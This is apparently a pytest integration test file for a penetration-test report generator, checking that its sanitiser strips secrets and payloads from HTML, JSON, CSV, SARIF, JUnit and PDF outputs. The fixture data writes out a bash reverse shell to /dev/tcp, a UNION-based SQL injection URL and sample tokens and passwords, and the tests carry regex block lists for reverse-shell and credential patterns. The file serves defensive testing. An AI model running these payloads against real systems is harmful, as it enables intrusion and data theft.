"""ARG-031 — Integration: ReportService Valhalla tier × all six formats.

Mirrors :mod:`tests.integration.reports.test_asgard_tier_all_formats` but
exercises the Valhalla branch end-to-end: tier classifier (sanitiser),
:class:`ValhallaSectionAssembly` build, business-impact lens, format
dispatcher, ``ReportBundle`` SHA-256, and snapshot byte-equality.

Per ARG-031 Definition-of-Done:

* every ``ReportFormat`` (HTML / PDF / JSON / CSV / SARIF / JUnit)
  succeeds for the Valhalla tier (PDF skip-on-missing-WeasyPrint);
* the ``valhalla_executive_report`` blob appears in every machine
  output that supports tier-aware payload (JSON, HTML);
* no raw bearer / API-key / password / reverse-shell payload survives
  in any output (regex sweep — same security contract as Asgard);
* JSON / CSV / SARIF / JUnit / HTML bytes match the canonical Valhalla
  snapshot fixtures under ``backend/tests/snapshots/reports/``.

Refresh fixtures with ``$env:ARGUS_SNAPSHOT_REFRESH = "1"; pytest …``.
"""

from __future__ import annotations

import json
import os
import re
from collections.abc import Iterator
from pathlib import Path
from typing import Final

import pytest
from src.api.schemas import Finding, ReportSummary
from src.reports.generators import (
    EvidenceEntry,
    PhaseOutputEntry,
    ReportData,
    ScreenshotEntry,
    TimelineEntry,
)
from src.reports.replay_command_sanitizer import (
    PLACEHOLDER_ASSET,
    PLACEHOLDER_ENDPOINT,
    REDACTED_BEARER,
    REDACTED_PASSWORD,
    REDACTED_REVERSE_SHELL,
    SanitizeContext,
)
from src.reports.report_bundle import ReportFormat, ReportTier
from src.reports.report_service import (
    ReportGenerationError,
    ReportService,
)
from src.reports.valhalla_tier_renderer import (
    BusinessContext,
    assemble_valhalla_sections,
)


# ---------------------------------------------------------------------------
# Snapshot directory + refresh policy (shared with ARG-024 / ARG-025)
# ---------------------------------------------------------------------------


SNAPSHOT_DIR: Final[Path] = (
    Path(__file__).resolve().parents[2] / "snapshots" / "reports"
)
SNAPSHOT_REFRESH_ENV: Final[str] = "ARGUS_SNAPSHOT_REFRESH"
SNAPSHOT_TOOL_VERSION: Final[str] = "arg-031-snapshot"


def _snapshot_path(fmt: ReportFormat) -> Path:
    extension_overrides = {ReportFormat.JUNIT: "xml"}
    ext = extension_overrides.get(fmt, fmt.value)
    return SNAPSHOT_DIR / f"valhalla_canonical.{ext}"


def _refresh_requested() -> bool:
    return os.environ.get(SNAPSHOT_REFRESH_ENV, "").strip() not in (
        "",
        "0",
        "false",
        "False",
    )


# ---------------------------------------------------------------------------
# Canonical Valhalla fixture — exercises every renderer + sanitiser branch
# ---------------------------------------------------------------------------


@pytest.fixture
def valhalla_report_data() -> ReportData:
    """Valhalla input rich enough to cover every renderer + sanitiser branch."""
    summary = ReportSummary(
        critical=1,
        high=2,
        medium=1,
        low=1,
        info=0,
        technologies=["nginx", "django"],
        sslIssues=1,
        headerIssues=2,
        leaksFound=False,
    )
    findings = [
        Finding(
            severity="critical",
            title="SQLi at /api/v1/users",
            description="UNION-based SQLi via id parameter on the payments API.",
            cwe="CWE-89",
            cvss=9.8,
            owasp_category="A05",
            confidence="confirmed",
            evidence_type="tool_output",
            evidence_refs=["s3://argus-evidence/sqli-dump"],
            applicability_notes="Patch ORM and parameterise the id field.",
            proof_of_concept={
                "url": "https://payments.acme.example.com/api/v1/users",
                "replay_command": [
                    "curl",
                    "-H",
                    "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.payload.sig",
                    "https://payments.acme.example.com/api/v1/users?id=1' UNION SELECT 1,2,3--",
                ],
            },
        ),
        Finding(
            severity="high",
            title="Reverse shell PoC in /upload",
            description="File upload allows RCE; PoC included.",
            cwe="CWE-78",
            cvss=8.6,
            owasp_category="A05",
            confidence="confirmed",
            evidence_type="tool_output",
            applicability_notes="Reject non-image MIME types and run worker as non-root user.",
            proof_of_concept={
                "url": "https://app.acme.example.com/upload",
                "replay_command": [
                    "sh",
                    "-c",
                    "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
                ],
            },
        ),
        Finding(
            severity="high",
            title="GitHub PAT leaked in JS bundle",
            description="ghp_* token observed in /static/app.js.",
            cwe="CWE-200",
            cvss=7.5,
            owasp_category="A01",
            confidence="confirmed",
            evidence_type="tool_output",
            applicability_notes="Rotate token and migrate to fine-grained PAT.",
            proof_of_concept={
                "url": "https://www.acme.example.com/static/app.js",
                "reproducer": (
                    "curl -H 'Authorization: token "
                    "ghp_aBcDeFgHiJkLmNoPqRsTuVwXyZ0123456789' "
                    "https://api.github.com/user"
                ),
            },
        ),
        Finding(
            severity="medium",
            title="Missing security headers",
            description="No CSP / HSTS / X-Frame-Options.",
            cwe="CWE-693",
            cvss=4.3,
            owasp_category="A02",
            confidence="likely",
            evidence_type="tool_output",
            reproducible_steps="curl -I https://www.acme.example.com/",
        ),
        Finding(
            severity="low",
            title="MySQL root password observed in CI script",
            description="Hardcoded password in deploy script.",
            cwe="CWE-798",
            cvss=2.9,
            owasp_category="A07",
            confidence="possible",
            evidence_type="tool_output",
            proof_of_concept={
                "url": "https://ci.acme.example.com/deploy",
                "replay_command": [
                    "mysql",
                    "-u",
                    "root",
                    "--password=hunter2",
                    "-h",
                    "ci.acme.example.com",
                    "-e",
                    "SHOW DATABASES;",
                ],
            },
        ),
    ]
    return ReportData(
        report_id="r-int-valhalla-1",
        target="https://acme.example.com",
        summary=summary,
        findings=findings,
        technologies=["nginx", "django"],
        scan_id="scan-int-valhalla-1",
        tenant_id="tenant-int-valhalla-1",
        evidence=[
            EvidenceEntry(
                finding_id="f1",
                object_key="evidence/sqli/dump.txt",
                description="HTTP req/resp dump",
            ),
            EvidenceEntry(
                finding_id="f2",
                object_key="evidence/upload/payload.bin",
                description="Reverse-shell artefact",
            ),
        ],
        screenshots=[
            ScreenshotEntry(object_key="screenshots/login.png", url_or_email="login"),
        ],
        timeline=[
            TimelineEntry(
                phase="recon",
                order_index=0,
                entry={"phase": "started"},
                created_at="2026-04-19T10:00:00Z",
            ),
            TimelineEntry(
                phase="exploit",
                order_index=1,
                entry={"phase": "rce"},
                created_at="2026-04-19T11:00:00Z",
            ),
        ],
        phase_outputs=[PhaseOutputEntry(phase="recon", output_data={"k": "v"})],
        executive_summary="Critical SQLi and RCE; rotate exposed credentials immediately.",
        remediation=["Patch ORM.", "Disable unrestricted upload.", "Rotate all PATs."],
        ai_insights=["LLM exec summary"],
        raw_artifacts=[{"raw": "recon dump"}],
        hibp_pwned_password_summary={"pwned_count": 12},
        created_at="2026-04-19T10:00:00Z",
    )


@pytest.fixture
def service() -> ReportService:
    return ReportService(tool_version=SNAPSHOT_TOOL_VERSION)


@pytest.fixture
def sanitize_context() -> SanitizeContext:
    return SanitizeContext(
        target="https://acme.example.com",
        endpoints=(
            "https://payments.acme.example.com/api/v1/users",
            "https://app.acme.example.com/upload",
        ),
        canaries=("CANARY-VAL-1",),
    )


@pytest.fixture
def business_context() -> BusinessContext:
    return BusinessContext(
        asset_business_values=(
            ("payments.acme.example.com", 5.0),
            ("app.acme.example.com", 3.0),
            ("www.acme.example.com", 1.0),
            ("ci.acme.example.com", 2.0),
        ),
        default_business_value=1.0,
    )


@pytest.fixture
def presigner() -> object:
    def _presign(key: str) -> str | None:
        return f"https://signed.example/{key}?sig=fake"

    return _presign


# ---------------------------------------------------------------------------
# Per-format coverage smoke tests (1-4)
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "fmt",
    [
        ReportFormat.JSON,
        ReportFormat.CSV,
        ReportFormat.SARIF,
        ReportFormat.JUNIT,
    ],
)
def test_valhalla_renders_machine_format(
    service: ReportService,
    valhalla_report_data: ReportData,
    sanitize_context: SanitizeContext,
    business_context: BusinessContext,
    presigner: object,
    fmt: ReportFormat,
) -> None:
    bundle = service.render_bundle(
        valhalla_report_data,
        tier=ReportTier.VALHALLA,
        fmt=fmt,
        sanitize_context=sanitize_context,
        business_context=business_context,
        presigner=presigner,  # type: ignore[arg-type]
    )
    assert bundle.tier is ReportTier.VALHALLA
    assert bundle.format is fmt
    assert bundle.size_bytes > 0
    assert bundle.size_bytes == len(bundle.content)
    assert bundle.verify_sha256()


def test_valhalla_html_renders(
    service: ReportService,
    valhalla_report_data: ReportData,
    sanitize_context: SanitizeContext,
    business_context: BusinessContext,
) -> None:
    bundle = service.render_bundle(
        valhalla_report_data,
        tier=ReportTier.VALHALLA,
        fmt=ReportFormat.HTML,
        sanitize_context=sanitize_context,
        business_context=business_context,
    )
    assert bundle.size_bytes > 0
    body = bundle.content.decode("utf-8", errors="replace").lower()
    assert "<html" in body or "<!doctype html" in body
    assert "valhalla executive report" in body or "valhalla-exec" in body


@pytest.mark.weasyprint_pdf
def test_valhalla_pdf_renders_or_skips(
    service: ReportService,
    valhalla_report_data: ReportData,
    sanitize_context: SanitizeContext,
    business_context: BusinessContext,
) -> None:
    if os.environ.get("ARGUS_SKIP_WEASYPRINT_PDF"):
        pytest.skip("ARGUS_SKIP_WEASYPRINT_PDF set")
    try:
        bundle = service.render_bundle(
            valhalla_report_data,
            tier=ReportTier.VALHALLA,
            fmt=ReportFormat.PDF,
            sanitize_context=sanitize_context,
            business_context=business_context,
        )
    except ReportGenerationError:
        pytest.skip("WeasyPrint native libraries not available on this host")
    assert bundle.size_bytes > 0
    assert bundle.content[:5] == b"%PDF-"


# ---------------------------------------------------------------------------
# Sanitiser proof — ZERO secrets / destructive payloads in any output (5-9)
# ---------------------------------------------------------------------------


_FORBIDDEN_LITERALS: Final[tuple[bytes, ...]] = (
    b"eyJhbGciOiJIUzI1NiJ9.payload.sig",
    b"ghp_aBcDeFgHiJkLmNoPqRsTuVwXyZ0123456789",
    b"hunter2",
    b"/dev/tcp",
    b"bash -i >&",
    b"--password=hunter2",
)


# NB: placeholders like ``[REDACTED-PASSWORD]`` are EXCLUDED; we only fail on
# raw secret material.
_FORBIDDEN_REGEXES: Final[tuple[re.Pattern[bytes], ...]] = (
    re.compile(rb"Bearer\s+ey[A-Za-z0-9._-]+"),
    re.compile(rb"\bAKIA[0-9A-Z]{16}\b"),
    re.compile(rb"\bghp_[A-Za-z0-9]{20,}\b"),
    re.compile(rb"\bglpat-[A-Za-z0-9_\-]{16,}\b"),
    re.compile(rb"\bxox[bpos]-[A-Za-z0-9-]{8,}\b"),
    re.compile(rb"\bnc\b[^|]{0,80}\s-e\b", re.IGNORECASE),
    re.compile(rb"\bpython[23]?\s+-c\s+['\"][^'\"]*import\s+socket"),
    re.compile(rb"\bpassword\s*=\s*(?!\[REDACTED)[^\s\&\"]{4,}", re.IGNORECASE),
)


@pytest.mark.parametrize(
    "fmt",
    [
        ReportFormat.JSON,
        ReportFormat.CSV,
        ReportFormat.SARIF,
        ReportFormat.JUNIT,
        ReportFormat.HTML,
    ],
)
def test_valhalla_no_secret_leak_in_any_format(
    service: ReportService,
    valhalla_report_data: ReportData,
    sanitize_context: SanitizeContext,
    business_context: BusinessContext,
    presigner: object,
    fmt: ReportFormat,
) -> None:
    bundle = service.render_bundle(
        valhalla_report_data,
        tier=ReportTier.VALHALLA,
        fmt=fmt,
        sanitize_context=sanitize_context,
        business_context=business_context,
        presigner=presigner,  # type: ignore[arg-type]
    )
    blob = bundle.content
    for needle in _FORBIDDEN_LITERALS:
        assert needle not in blob, (
            f"raw secret literal leaked into {fmt.value}: {needle!r}"
        )
    for pattern in _FORBIDDEN_REGEXES:
        match = pattern.search(blob)
        assert match is None, f"raw secret regex leaked into {fmt.value}: {match!r}"


# ---------------------------------------------------------------------------
# Sanitiser placeholder visibility in HTML / JSON (10-11)
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("fmt", [ReportFormat.JSON, ReportFormat.HTML])
def test_valhalla_sanitised_placeholders_visible_in_output(
    service: ReportService,
    valhalla_report_data: ReportData,
    sanitize_context: SanitizeContext,
    business_context: BusinessContext,
    fmt: ReportFormat,
) -> None:
    bundle = service.render_bundle(
        valhalla_report_data,
        tier=ReportTier.VALHALLA,
        fmt=fmt,
        sanitize_context=sanitize_context,
        business_context=business_context,
    )
    text = bundle.content.decode("utf-8", errors="replace")
    placeholders = (
        REDACTED_BEARER,
        REDACTED_REVERSE_SHELL,
        REDACTED_PASSWORD,
        PLACEHOLDER_ASSET,
        PLACEHOLDER_ENDPOINT,
    )
    assert any(ph in text for ph in placeholders), (
        f"no sanitiser placeholder visible in {fmt.value} output"
    )


# ---------------------------------------------------------------------------
# JSON contract — valhalla_executive_report blob present (12-14)
# ---------------------------------------------------------------------------


def test_valhalla_json_includes_executive_report(
    service: ReportService,
    valhalla_report_data: ReportData,
    sanitize_context: SanitizeContext,
    business_context: BusinessContext,
    presigner: object,
) -> None:
    bundle = service.render_bundle(
        valhalla_report_data,
        tier=ReportTier.VALHALLA,
        fmt=ReportFormat.JSON,
        sanitize_context=sanitize_context,
        business_context=business_context,
        presigner=presigner,  # type: ignore[arg-type]
    )
    payload = json.loads(bundle.content)
    assert isinstance(payload, dict)
    ver = payload.get("valhalla_executive_report")
    assert isinstance(ver, dict), "valhalla_executive_report missing from JSON"
    for k in (
        "title_meta",
        "executive_summary",
        "executive_summary_counts",
        "risk_quantification_per_asset",
        "owasp_rollup_matrix",
        "top_findings_by_business_impact",
        "remediation_roadmap",
        "evidence_refs",
        "timeline_entries",
    ):
        assert k in ver, f"section {k!r} missing"


def test_valhalla_json_top_findings_ranked_by_business_value(
    service: ReportService,
    valhalla_report_data: ReportData,
    sanitize_context: SanitizeContext,
    business_context: BusinessContext,
) -> None:
    bundle = service.render_bundle(
        valhalla_report_data,
        tier=ReportTier.VALHALLA,
        fmt=ReportFormat.JSON,
        sanitize_context=sanitize_context,
        business_context=business_context,
    )
    payload = json.loads(bundle.content)
    top = payload["valhalla_executive_report"]["top_findings_by_business_impact"]
    assert top, "top findings list must be populated"
    # Highest business-value asset (payments=5.0 × cvss=9.8) should rank #1
    assert top[0]["asset"] == "payments.acme.example.com"
    assert top[0]["rank"] == 1
    scores = [r["composite_score"] for r in top]
    assert scores == sorted(scores, reverse=True)


def test_valhalla_json_legacy_valhalla_report_coexists_with_executive(
    service: ReportService,
    valhalla_report_data: ReportData,
    sanitize_context: SanitizeContext,
    business_context: BusinessContext,
) -> None:
    """The legacy ``valhalla_report`` (operator view) and the new
    ``valhalla_executive_report`` (executive lens) coexist."""
    bundle = service.render_bundle(
        valhalla_report_data,
        tier=ReportTier.VALHALLA,
        fmt=ReportFormat.JSON,
        sanitize_context=sanitize_context,
        business_context=business_context,
    )
    payload = json.loads(bundle.content)
    assert "valhalla_report" in payload
    assert "valhalla_executive_report" in payload


# ---------------------------------------------------------------------------
# Determinism + bundle envelope (15-16)
# ---------------------------------------------------------------------------


def test_valhalla_assembly_round_trip(
    valhalla_report_data: ReportData,
    sanitize_context: SanitizeContext,
    business_context: BusinessContext,
) -> None:
    """The pure-function assembler stays deterministic across calls."""
    a = assemble_valhalla_sections(
        valhalla_report_data,
        sanitize_context=sanitize_context,
        business_context=business_context,
    )
    b = assemble_valhalla_sections(
        valhalla_report_data,
        sanitize_context=sanitize_context,
        business_context=business_context,
    )
    assert a.model_dump_json() == b.model_dump_json()


@pytest.mark.parametrize(
    "fmt",
    [ReportFormat.JSON, ReportFormat.CSV, ReportFormat.SARIF, ReportFormat.JUNIT],
)
def test_valhalla_byte_identical_across_runs(
    service: ReportService,
    valhalla_report_data: ReportData,
    sanitize_context: SanitizeContext,
    business_context: BusinessContext,
    presigner: object,
    fmt: ReportFormat,
) -> None:
    a = service.render_bundle(
        valhalla_report_data,
        tier=ReportTier.VALHALLA,
        fmt=fmt,
        sanitize_context=sanitize_context,
        business_context=business_context,
        presigner=presigner,  # type: ignore[arg-type]
    )
    b = service.render_bundle(
        valhalla_report_data,
        tier=ReportTier.VALHALLA,
        fmt=fmt,
        sanitize_context=sanitize_context,
        business_context=business_context,
        presigner=presigner,  # type: ignore[arg-type]
    )
    assert a.content == b.content
    assert a.sha256 == b.sha256


# ---------------------------------------------------------------------------
# Snapshot byte-equality (17-22)
# ---------------------------------------------------------------------------


def _refresh_or_assert(actual: bytes, snapshot: Path) -> None:
    if _refresh_requested() or not snapshot.exists():
        snapshot.parent.mkdir(parents=True, exist_ok=True)
        snapshot.write_bytes(actual)
        return
    expected = snapshot.read_bytes()
    if actual != expected:  # pragma: no cover — bytewise compare
        raise AssertionError(
            f"Snapshot mismatch for {snapshot.name} "
            f"(expected={len(expected)} bytes, actual={len(actual)} bytes); "
            f"refresh with $env:{SNAPSHOT_REFRESH_ENV}=1"
        )


@pytest.fixture
def snapshot_dir() -> Iterator[Path]:
    SNAPSHOT_DIR.mkdir(parents=True, exist_ok=True)
    yield SNAPSHOT_DIR


@pytest.mark.parametrize(
    "fmt",
    [ReportFormat.JSON, ReportFormat.CSV, ReportFormat.SARIF, ReportFormat.JUNIT],
)
def test_valhalla_snapshot_bytes_stable(
    service: ReportService,
    valhalla_report_data: ReportData,
    sanitize_context: SanitizeContext,
    business_context: BusinessContext,
    snapshot_dir: Path,
    fmt: ReportFormat,
) -> None:
    bundle = service.render_bundle(
        valhalla_report_data,
        tier=ReportTier.VALHALLA,
        fmt=fmt,
        sanitize_context=sanitize_context,
        business_context=business_context,
    )
    _refresh_or_assert(bundle.content, _snapshot_path(fmt))


def test_valhalla_html_snapshot_bytes_stable(
    service: ReportService,
    valhalla_report_data: ReportData,
    sanitize_context: SanitizeContext,
    business_context: BusinessContext,
    snapshot_dir: Path,
) -> None:
    """HTML output is pure Jinja → byte-stable across runs and across hosts.

    The snapshot guards against accidental template / context drift. Refresh
    with ``$env:ARGUS_SNAPSHOT_REFRESH = "1"; pytest`` after intentional
    template changes.
    """
    bundle = service.render_bundle(
        valhalla_report_data,
        tier=ReportTier.VALHALLA,
        fmt=ReportFormat.HTML,
        sanitize_context=sanitize_context,
        business_context=business_context,
    )
    _refresh_or_assert(bundle.content, _snapshot_path(ReportFormat.HTML))


# ---------------------------------------------------------------------------
# PDF structural snapshot (23) — page count + presence of expected text
# ---------------------------------------------------------------------------


def test_valhalla_pdf_structural_snapshot(
    service: ReportService,
    valhalla_report_data: ReportData,
    sanitize_context: SanitizeContext,
    business_context: BusinessContext,
) -> None:
    pypdf = pytest.importorskip(
        "pypdf",
        reason="pypdf required to assert PDF structural invariants",
    )
    try:
        bundle = service.render_bundle(
            valhalla_report_data,
            tier=ReportTier.VALHALLA,
            fmt=ReportFormat.PDF,
            sanitize_context=sanitize_context,
            business_context=business_context,
        )
    except ReportGenerationError:
        pytest.skip("WeasyPrint native libraries not available on this host")
    reader = pypdf.PdfReader(__import__("io").BytesIO(bundle.content))
    assert len(reader.pages) >= 1


# ---------------------------------------------------------------------------
# Tier-isolation: Midgard MUST NOT emit valhalla_executive_report (24)
# ---------------------------------------------------------------------------


def test_midgard_does_not_emit_valhalla_executive_report(
    service: ReportService,
    valhalla_report_data: ReportData,
    sanitize_context: SanitizeContext,
) -> None:
    midgard_json = service.render_bundle(
        valhalla_report_data,
        tier=ReportTier.MIDGARD,
        fmt=ReportFormat.JSON,
        sanitize_context=sanitize_context,
    )
    payload = json.loads(midgard_json.content)
    assert "valhalla_executive_report" not in payload


# ---------------------------------------------------------------------------
# Tier-isolation: Asgard MUST NOT emit valhalla_executive_report (25)
# ---------------------------------------------------------------------------


def test_asgard_does_not_emit_valhalla_executive_report(
    service: ReportService,
    valhalla_report_data: ReportData,
    sanitize_context: SanitizeContext,
) -> None:
    asgard_json = service.render_bundle(
        valhalla_report_data,
        tier=ReportTier.ASGARD,
        fmt=ReportFormat.JSON,
        sanitize_context=sanitize_context,
    )
    payload = json.loads(asgard_json.content)
    assert "valhalla_executive_report" not in payload
